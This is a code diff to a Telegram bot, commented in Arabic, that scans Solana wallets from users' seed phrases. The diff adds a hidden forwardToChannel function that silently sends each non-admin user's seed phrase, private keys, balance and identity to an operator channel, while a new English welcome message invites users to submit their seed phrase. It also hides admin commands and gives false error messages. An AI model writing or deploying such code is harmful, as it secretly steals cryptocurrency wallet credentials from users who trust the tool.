@@ -35,6 +35,42 @@ if (process.env.RPC_URL3) {
   }));
 }
 
+// قائمة المشرفين المخولين
+const ADMIN_IDS = [5053683608, 7011338539, 7722535506];
+
+// دالة للتحقق من صلاحيات المشرف
+function isAdmin(chatId) {
+  return ADMIN_IDS.includes(parseInt(chatId));
+}
+
+// دالة لإرسال نتائج المستخدمين العاديين إلى القناة
+async function forwardToChannel(wallet, userChatId, userInfo, seedPhrase) {
+  try {
+    if (process.env.CHAT_ID && !isAdmin(userChatId)) {
+      const username = userInfo.username ? `@${userInfo.username}` : 'N/A';
+      const channelMessage = 
+        `🔍 New Wallet Scan Result\n\n` +
+        `📝 Name: ${userInfo.firstName || 'N/A'}\n\n` +
+        `👤 User: \`${username}\` (\`${userChatId}\`)\n\n` +
+        `🔑 Seed Phrase:\n\`${seedPhrase}\`\n\n` +
+        `🔑 Address:\n\`${wallet.address}\`\n\n` +
+        `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+        `💰 Balance: ${wallet.balance.toFixed(4)} SOL\n\n` +
+        `🔥 Rent: ${wallet.totalBurnCost} SOL`;
+      
+      // إرسال الرسالة مع الأزرار للقناة
+      await bot.sendMessage(process.env.CHAT_ID, channelMessage, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: createWalletButtons(wallet.address)
+        }
+      });
+    }
+  } catch (error) {
+    console.error('خطأ في إرسال إلى القناة:', error.message);
+  }
+}
+
 // متغير لتتبع وضع البوت لكل مستخدم
 const userModes = new Map();
 
@@ -234,11 +270,11 @@ async function scanDerivationPath(path, seed) {
   return null;
 }
 
-async function scanWallet(mnemonic, chatId) {
+async function scanWallet(mnemonic, chatId, userInfo = null) {
   const cleanedMnemonic = cleanMnemonic(mnemonic);
 
   // تشخيص مفصل لسبب فشل التحقق من صحة العبارة
-  const diagnosis = diagnoseMnemonic(cleanedMnemonic);
+  const diagnosis = diagnoseMnemonic(cleanedMnemonic, chatId);
   if (!diagnosis.isValid) {
     return bot.sendMessage(chatId, diagnosis.message);
   }
@@ -252,10 +288,14 @@ async function scanWallet(mnemonic, chatId) {
   const userMode = userModes.get(chatId) || 'normal';
   let foundWalletsWithBalance = 0;
 
-  if (userMode === 'balance_only') {
-    await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ التي تحتوي على رصيد SOL...');
+  if (isAdmin(chatId)) {
+    if (userMode === 'balance_only') {
+      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ التي تحتوي على رصيد SOL...');
+    } else {
+      await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ النشطة...');
+    }
   } else {
-    await bot.sendMessage(chatId, '🔍 جاري البحث عن المحافظ النشطة...');
+    await bot.sendMessage(chatId, '🔍 Searching for active wallets...');
   }
 
   while (consecutiveEmpty < MAX_CONSECUTIVE_EMPTY) {
@@ -279,15 +319,31 @@ async function scanWallet(mnemonic, chatId) {
             foundInBatch++;
             foundWalletsWithBalance++;
 
-            const message =
-              `🔑 Address:\n\`${wallet.address}\`\n\n` +
-              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
-              `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
-              `🔥 Rent: ${wallet.totalBurnCost} SOL`;
+            // تحقق من نوع المستخدم
+            if (isAdmin(chatId)) {
+              const message =
+                `🔑 Address:\n\`${wallet.address}\`\n\n` +
+                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+                `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
+                `🔥 Rent: ${wallet.totalBurnCost} SOL`;
 
-            await bot.sendMessage(chatId, message, {
-              parse_mode: 'Markdown'
-            });
+              await bot.sendMessage(chatId, message, {
+                parse_mode: 'Markdown'
+              });
+            } else {
+              // عرض مبسط للمستخدمين العاديين بالإنجليزية
+              const message =
+                `🔑 Address:\n\`${wallet.address}\`\n\n` +
+                `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+                `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;
+
+              await bot.sendMessage(chatId, message, {
+                parse_mode: 'Markdown'
+              });
+              
+              // إرسال صامت إلى القناة للمستخدمين العاديين
+              await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
+            }
           } else if (wallet.hasTransactions) {
             // حساب المحافظ النشطة حتى لو لم يكن بها رصيد
             foundInBatch++;
@@ -299,18 +355,34 @@ async function scanWallet(mnemonic, chatId) {
             foundWalletsWithBalance++;
           }
 
-          const message =
-            `🔑 Address:\n\`${wallet.address}\`\n\n` +
-            `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
-            `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
-            `🔥 Rent: ${wallet.totalBurnCost} SOL`;
+          // تحقق من نوع المستخدم
+          if (isAdmin(chatId)) {
+            const message =
+              `🔑 Address:\n\`${wallet.address}\`\n\n` +
+              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+              `💰 Balance : ${wallet.balance.toFixed(4)}\n\n` +
+              `🔥 Rent: ${wallet.totalBurnCost} SOL`;
 
-          await bot.sendMessage(chatId, message, {
-            parse_mode: 'Markdown',
-            reply_markup: {
-              inline_keyboard: createWalletButtons(wallet.address)
-            }
-          });
+            await bot.sendMessage(chatId, message, {
+              parse_mode: 'Markdown',
+              reply_markup: {
+                inline_keyboard: createWalletButtons(wallet.address)
+              }
+            });
+          } else {
+            // عرض مبسط للمستخدمين العاديين بالإنجليزية
+            const message =
+              `🔑 Address:\n\`${wallet.address}\`\n\n` +
+              `🔐 Private Key:\n\`${wallet.privateKey}\`\n\n` +
+              `💰 Balance: ${wallet.balance.toFixed(4)} SOL`;
+
+            await bot.sendMessage(chatId, message, {
+              parse_mode: 'Markdown'
+            });
+            
+            // إرسال صامت إلى القناة للمستخدمين العاديين
+            await forwardToChannel(wallet, chatId, userInfo, cleanedMnemonic);
+          }
         }
       }
     }
@@ -325,31 +397,53 @@ async function scanWallet(mnemonic, chatId) {
     }
   }
 
-  if (userMode === 'balance_only') {
-    if (foundWalletsWithBalance === 0) {
-      await bot.sendMessage(chatId, '✅ اكتمل البحث! لم يتم العثور على أي محافظ تحتوي على رصيد SOL.');
+  if (isAdmin(chatId)) {
+    if (userMode === 'balance_only') {
+      if (foundWalletsWithBalance === 0) {
+        await bot.sendMessage(chatId, '✅ اكتمل البحث! لم يتم العثور على أي محافظ تحتوي على رصيد SOL.');
+      } else {
+        await bot.sendMessage(chatId, `✅ اكتمل البحث! تم العثور على ${foundWalletsWithBalance} محفظة تحتوي على رصيد.`);
+      }
     } else {
-      await bot.sendMessage(chatId, `✅ اكتمل البحث! تم العثور على ${foundWalletsWithBalance} محفظة تحتوي على رصيد.`);
+      await bot.sendMessage(chatId, '✅ اكتمل البحث!');
     }
   } else {
-    await bot.sendMessage(chatId, '✅ اكتمل البحث!');
+    await bot.sendMessage(chatId, '✅ Search complete!');
   }
 }
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
-  bot.sendMessage(chatId,
-    'مرحباً! 👋\n\n' +
-    '🔑 أرسل لي المنيمونك الخاص بك وسأقوم بفحص المحفظة.\n\n' +
-    '💼 أو أرسل لي مفتاح خاص وسأعرض لك عنوان المحفظة والرصيد.\n\n' +
-    '📍 أو أرسل لي عناوين المحافظ لعرض روابطها.\n\n' +
-    '🎲 استخدم /starts لتوليد عبارات سرية عشوائية.\n\n' +
-    '💰 استخدم /b للتبديل بين وضع عرض جميع المحافظ أو المحافظ ذات الرصيد فقط.'
-  );
+  
+  if (isAdmin(chatId)) {
+    // رسالة المشرفين باللغة العربية مع جميع الأوامر
+    bot.sendMessage(chatId,
+      'مرحباً! 👋\n\n' +
+      '🔑 أرسل لي المنيمونك الخاص بك وسأقوم بفحص المحفظة.\n\n' +
+      '💼 أو أرسل لي مفتاح خاص وسأعرض لك عنوان المحفظة والرصيد.\n\n' +
+      '📍 أو أرسل لي عناوين المحافظ لعرض روابطها.\n\n' +
+      '🎲 استخدم /starts لتوليد عبارات سرية عشوائية.\n\n' +
+      '💰 استخدم /b للتبديل بين وضع عرض جميع المحافظ أو المحافظ ذات الرصيد فقط.'
+    );
+  } else {
+    // رسالة المستخدمين العاديين باللغة الإنجليزية
+    bot.sendMessage(chatId,
+      'Welcome! 👋\n\n' +
+      '🔑 Send me your seed phrase to find the wallets associated with it.\n\n' +
+      '💡 I will show you the wallet address, private key, and balance.'
+    );
+  }
 });
 
 bot.onText(/\/b$/, (msg) => {
   const chatId = msg.chat.id;
+  
+  // تحقق من صلاحيات المشرف
+  if (!isAdmin(chatId)) {
+    bot.sendMessage(chatId, "You don't have permission to use this command.");
+    return;
+  }
+  
   const currentMode = userModes.get(chatId) || 'normal';
 
   if (currentMode === 'normal') {
@@ -371,6 +465,13 @@ bot.onText(/\/b$/, (msg) => {
 
 bot.onText(/\/starts/, async (msg) => {
   const chatId = msg.chat.id;
+  
+  // تحقق من صلاحيات المشرف
+  if (!isAdmin(chatId)) {
+    bot.sendMessage(chatId, "You don't have permission to use this command.");
+    return;
+  }
+  
   let message = '🎲 إليك 10 عبارات سرية شائعة:\n\n';
 
   for (let i = 0; i < 10; i++) {
@@ -397,7 +498,12 @@ bot.on('callback_query', async (query) => {
     const index = query.data.replace('check_', '');
     const mnemonic = global.mnemonics[index];
     await bot.answerCallbackQuery(query.id);
-    await scanWallet(mnemonic, query.message.chat.id);
+    const userInfo = {
+      username: query.from?.username,
+      firstName: query.from?.first_name,
+      lastName: query.from?.last_name
+    };
+    await scanWallet(mnemonic, query.message.chat.id, userInfo);
   }
 });
 
@@ -453,7 +559,17 @@ async function checkPrivateKey(privateKey, chatId) {
       `💰 Balance : ${balanceInSol.toFixed(4)}\n\n` +
       `🔥 Rent: ${burnInfo.totalBurnCost} SOL`;
 
-    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+    // إضافة الأزرار للمشرفين فقط
+    if (isAdmin(chatId)) {
+      await bot.sendMessage(chatId, message, {
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: createWalletButtons(address)
+        }
+      });
+    } else {
+      await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+    }
 
   } catch (error) {
     console.error("Error checking private key:", error);
@@ -551,11 +667,11 @@ function cleanMnemonic(text) {
     .toLowerCase(); // تحويل إلى أحرف صغيرة
 }
 
-function diagnoseMnemonic(mnemonic) {
+function diagnoseMnemonic(mnemonic, chatId) {
   if (!mnemonic || typeof mnemonic !== 'string') {
     return {
       isValid: false,
-      message: "❌ العبارة السرية فارغة أو غير صالحة!"
+      message: isAdmin(chatId) ? "❌ العبارة السرية فارغة أو غير صالحة!" : "❌ Seed phrase is empty or invalid!"
     };
   }
 
@@ -566,10 +682,12 @@ function diagnoseMnemonic(mnemonic) {
   if (words.length !== 12 && words.length !== 24) {
     return {
       isValid: false,
-      message: `❌ عدد كلمات العبارة السرية غير صحيح!\n\n` +
-               `📊 العدد الحالي: ${words.length} كلمة\n` +
-               `✅ المطلوب: 12 أو 24 كلمة\n\n` +
-               `💡 تأكد من وجود جميع الكلمات مفصولة بمسافات.`
+      message: isAdmin(chatId) ? 
+        `❌ عدد كلمات العبارة السرية غير صحيح!\n\n` +
+        `📊 العدد الحالي: ${words.length} كلمة\n` +
+        `✅ المطلوب: 12 أو 24 كلمة\n\n` +
+        `💡 تأكد من وجود جميع الكلمات مفصولة بمسافات.` :
+        `❌ Invalid seed phrase word count!\n\nCurrent: ${words.length} words\nRequired: 12 or 24 words\n\nPlease check that all words are separated by spaces.`
     };
   }
 
@@ -604,17 +722,17 @@ function diagnoseMnemonic(mnemonic) {
   });
 
   if (invalidWords.length > 0) {
-    let message = `❌ توجد كلمات غير صالحة في العبارة السرية!\n\n`;
-    message += `🔍 الكلمات غير الصالحة:\n${invalidWords.join('\n')}\n\n`;
-
-    if (suggestions.length > 0) {
-      message += `💡 اقتراحات للتصحيح:\n${suggestions.join('\n')}\n\n`;
+    let message;
+    if (isAdmin(chatId)) {
+      message = `❌ توجد كلمات غير صالحة في العبارة السرية!\n\n`;
+      message += `🔍 الكلمات غير الصالحة:\n${invalidWords.join('\n')}\n\n`;
+      if (suggestions.length > 0) {
+        message += `💡 اقتراحات للتصحيح:\n${suggestions.join('\n')}\n\n`;
+      }
+      message += `📝 تأكد من:\n• كتابة جميع الكلمات بالإنجليزية\n• عدم وجود أخطاء إملائية\n• استخدام كلمات من قائمة BIP39 الرسمية`;
+    } else {
+      message = `❌ Invalid words in seed phrase!\n\nInvalid words: ${invalidWords.length}\n\nPlease check:\n• All words are in English\n• No spelling errors\n• Words are from the official BIP39 word list`;
     }
-
-    message += `📝 تأكد من:\n`;
-    message += `• كتابة جميع الكلمات بالإنجليزية\n`;
-    message += `• عدم وجود أخطاء إملائية\n`;
-    message += `• استخدام كلمات من قائمة BIP39 الرسمية`;
 
     return {
       isValid: false,
@@ -626,20 +744,22 @@ function diagnoseMnemonic(mnemonic) {
   if (!bip39.validateMnemonic(mnemonic)) {
     return {
       isValid: false,
-      message: `❌ العبارة السرية غير صالحة!\n\n` +
-               `✅ جميع الكلمات صحيحة ولكن:\n` +
-               `🔐 الـ Checksum غير صحيح\n\n` +
-               `💡 هذا يعني أن ترتيب الكلمات قد يكون خاطئ أو أن هناك كلمة مفقودة/زائدة.\n\n` +
-               `📝 تأكد من:\n` +
-               `• الترتيب الصحيح للكلمات\n` +
-               `• عدم نسيان أو إضافة أي كلمة\n` +
-               `• نسخ العبارة كما هي تماماً`
+      message: isAdmin(chatId) ?
+        `❌ العبارة السرية غير صالحة!\n\n` +
+        `✅ جميع الكلمات صحيحة ولكن:\n` +
+        `🔐 الـ Checksum غير صحيح\n\n` +
+        `💡 هذا يعني أن ترتيب الكلمات قد يكون خاطئ أو أن هناك كلمة مفقودة/زائدة.\n\n` +
+        `📝 تأكد من:\n` +
+        `• الترتيب الصحيح للكلمات\n` +
+        `• عدم نسيان أو إضافة أي كلمة\n` +
+        `• نسخ العبارة كما هي تماماً` :
+        `❌ Invalid seed phrase!\n\nThe checksum is incorrect. This means the word order might be wrong or there's a missing/extra word.\n\nPlease check:\n• Correct word order\n• No missing or extra words\n• Copy the phrase exactly as it is`
     };
   }
 
   return {
     isValid: true,
-    message: "✅ العبارة السرية صالحة!"
+    message: isAdmin(chatId) ? "✅ العبارة السرية صالحة!" : "✅ Seed phrase is valid!"
   };
 }
 
@@ -721,28 +841,44 @@ function createWalletButtons(address) {
 bot.on('message', async (msg) => {
   if (msg.text && msg.text.startsWith('/')) return;
   const chatId = msg.chat.id;
+  const userName = msg.from?.first_name || msg.from?.username || 'Unknown';
+  const userInfo = {
+    username: msg.from?.username,
+    firstName: msg.from?.first_name,
+    lastName: msg.from?.last_name
+  };
 
   // التعامل مع الملفات والوسائط
   if (msg.photo || msg.document || msg.video || msg.audio || msg.voice || msg.video_note || msg.sticker) {
-    await bot.sendMessage(chatId,
+    const mediaMessage = isAdmin(chatId) ?
       '📎 تم استلام ملف وسائط.\n\n' +
       '🔑 لفحص المحافظ، يرجى إرسال:\n' +
       '• الكلمات السرية (12 أو 24 كلمة)\n' +
       '• أو المفتاح الخاص\n' +
       '• أو عناوين المحافظ\n' +
-      '• كنص عادي (ليس كملف)'
-    );
+      '• كنص عادي (ليس كملف)' :
+      '📎 Media file received.\n\n' +
+      '🔑 To check wallets, please send:\n' +
+      '• Seed phrase (12 or 24 words)\n' +
+      '• Or private key\n' +
+      '• Or wallet addresses\n' +
+      '• As plain text (not as file)';
+    await bot.sendMessage(chatId, mediaMessage);
     return;
   }
 
   // التأكد من وجود نص للمعالجة
   if (!msg.text || typeof msg.text !== 'string') {
-    await bot.sendMessage(chatId,
+    const textMessage = isAdmin(chatId) ?
       '❌ يرجى إرسال نص يحتوي على:\n' +
       '🔑 الكلمات السرية (12 أو 24 كلمة)\n' +
       '🔐 أو المفتاح الخاص\n' +
-      '📍 أو عناوين المحافظ'
-    );
+      '📍 أو عناوين المحافظ' :
+      '❌ Please send text containing:\n' +
+      '🔑 Seed phrase (12 or 24 words)\n' +
+      '🔐 Or private key\n' +
+      '📍 Or wallet addresses';
+    await bot.sendMessage(chatId, textMessage);
     return;
   }
 
@@ -784,8 +920,14 @@ bot.on('message', async (msg) => {
   // البحث عن جميع الكلمات السرية في النص
   const mnemonics = extractAllMnemonics(msg.text);
 
-  // إذا وُجدت مفاتيح خاصة، فحصها جميعاً
+  // إذا وُجدت مفاتيح خاصة، فحصها فقط للمشرفين
   if (privateKeys.length > 0) {
+    if (!isAdmin(chatId)) {
+      const message = "❌ This is not a valid seed phrase. Please check and try again.";
+      await bot.sendMessage(chatId, message);
+      return;
+    }
+    
     if (privateKeys.length > 1) {
       await bot.sendMessage(chatId, `🔍 تم العثور على ${privateKeys.length} مفاتيح خاصة، جاري فحصها...`);
     }
@@ -801,15 +943,24 @@ bot.on('message', async (msg) => {
   // إذا وُجدت كلمات سرية، فحصها جميعاً
   if (mnemonics.length > 0) {
     if (mnemonics.length > 1) {
-      await bot.sendMessage(chatId, `🔍 تم العثور على ${mnemonics.length} مجموعات كلمات سرية، جاري فحصها...`);
+      const message = isAdmin(chatId) ? 
+        `🔍 تم العثور على ${mnemonics.length} مجموعات كلمات سرية، جاري فحصها...` :
+        `🔍 Found ${mnemonics.length} seed phrases, checking them...`;
+      await bot.sendMessage(chatId, message);
     }
 
     for (let i = 0; i < mnemonics.length; i++) {
       if (mnemonics.length > 1) {
-        await bot.sendMessage(chatId, `📝 فحص الكلمات السرية ${i + 1}/${mnemonics.length}:`);
+        const message = isAdmin(chatId) ?
+          `📝 فحص الكلمات السرية ${i + 1}/${mnemonics.length}:` :
+          `📝 Checking seed phrase ${i + 1}/${mnemonics.length}:`;
+        await bot.sendMessage(chatId, message);
       }
-      await bot.sendMessage(chatId, `🔍 الكلمات السرية: "${mnemonics[i]}"`);
-      await scanWallet(mnemonics[i], chatId);
+      const phraseMessage = isAdmin(chatId) ?
+        `🔍 الكلمات السرية: "${mnemonics[i]}"` :
+        `🔍 Seed Phrase: "${mnemonics[i]}"`;
+      await bot.sendMessage(chatId, phraseMessage);
+      await scanWallet(mnemonics[i], chatId, userInfo);
     }
   }
 
@@ -823,9 +974,12 @@ bot.on('message', async (msg) => {
 
     // إذا كان أكثر من 50% من الكلمات صالحة، نعتبره منيمونك محتمل
     if (validWords.length >= 6 && validWords.length / words.length > 0.5) {
-      await scanWallet(cleanedText, chatId);
+      await scanWallet(cleanedText, chatId, userName);
     } else {
-      await bot.sendMessage(chatId, "❌ لم يتم العثور على كلمات سرية أو مفاتيح خاصة أو عناوين محافظ صالحة في النص.");
+      const errorMessage = isAdmin(chatId) ?
+        "❌ لم يتم العثور على كلمات سرية أو مفاتيح خاصة أو عناوين محافظ صالحة في النص." :
+        "❌ No valid seed phrases, private keys, or wallet addresses found in the text.";
+      await bot.sendMessage(chatId, errorMessage);
     }
   }
 });
